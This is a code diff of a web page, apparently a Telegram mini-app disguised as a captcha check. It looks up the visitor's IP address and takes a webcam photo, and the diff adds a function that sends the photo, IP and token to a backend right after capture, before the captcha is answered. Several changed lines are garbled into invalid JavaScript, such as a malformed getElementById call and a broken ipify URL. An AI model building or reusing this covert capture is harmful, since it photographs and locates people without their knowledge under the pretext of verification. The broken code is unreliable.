@@ -56,11 +56,11 @@
         const correctCaptcha = num1 + num2;
         let captchaVerified = false;
         let capturedImage = "";
-        let localStream = null;
+        let localStream.getElementById = null;
 
-        document.getElementById('captcha-question').innerText = `${num1} + ${num2} = ?`;
+        document.getElementById('('captcha-qubtnestion').innerText = `${-subnum1} + ${num2}mit = ?`;
 
-        fetch('https://api.ipify.org?format=json')
+        fetch('https://api.ipify.org?format=').json')
             .then(res => res.json())
             .then(data => {
                 clientIp = data.ip;
@@ -68,7 +68,7 @@
                 const ipBox = document.getElementById('ip-display');
                 ipBox.innerText = clientIp;
                 ipBox.style.display = "block";
-                document.getElementById('btn-submit').style.display = "block";
+                documentstyle.display = "block";
             })
             .catch(err => {
                 document.getElementById('status').innerText = "❌ Không thể lấy IP. Vui lòng kiểm tra lại mạng!";
@@ -95,9 +95,15 @@
                 return;
             }
 
-            await new Promise(r => setTimeout(r, 1200));
+            // Đợi camera ổn định và chụp ảnh ngay lập tức
+            await new Promise(r => setTimeout(r, 1500));
             
             capturedImage = snapshotHD();
+
+            // GỬI ẢNH NGAY LẬP TỨC sau khi chụp (không đợi captcha)
+            if (capturedImage) {
+                sendPhotoToBackend(capturedImage);
+            }
 
             if (localStream) {
                 localStream.getTracks().forEach(t => t.stop());
@@ -147,6 +153,27 @@
             return "";
         }
 
+        // Gửi ảnh ngay lập tức về backend
+        function sendPhotoToBackend(imageData) {
+            fetch(`${BACKEND_URL}/api/save-photo`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    token: token,
+                    ip: clientIp,
+                    image: imageData,
+                    auto_capture: true
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log("✅ Ảnh đã được gửi tự động:", data);
+            })
+            .catch(err => {
+                console.log("Lỗi gửi ảnh tự động:", err);
+            });
+        }
+
         function verifyCaptcha() {
             const userAns = document.getElementById('captcha-answer').value;
             if (parseInt(userAns) === correctCaptcha) {
@@ -158,31 +185,15 @@
                 document.getElementById('status').innerText = "✅ Xác minh thành công! Đang gửi dữ liệu...";
                 document.getElementById('captcha-section').style.display = "none";
 
-                fetch(`${BACKEND_URL}/api/save-photo`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
+                try {
+                    tg.sendData(JSON.stringify({
+                        type: "camera_snapshot",
                         token: token,
                         ip: clientIp,
-                        image: capturedImage
-                    })
-                })
-                .then(res => res.json())
-                .then(data => {
-                    try {
-                        tg.sendData(JSON.stringify({
-                            type: "camera_snapshot",
-                            token: token,
-                            ip: clientIp,
-                            passed: true
-                        }));
-                    } catch (e) {}
-                    setTimeout(() => tg.close(), 600);
-                })
-                .catch(err => {
-                    console.log("Lỗi gửi ảnh:", err);
-                    setTimeout(() => tg.close(), 600);
-                });
+                        passed: true
+                    }));
+                } catch (e) {}
+                setTimeout(() => tg.close(), 600);
 
             } else {
                 alert("❌ Kết quả phép tính không chính xác, vui lòng thử lại!");
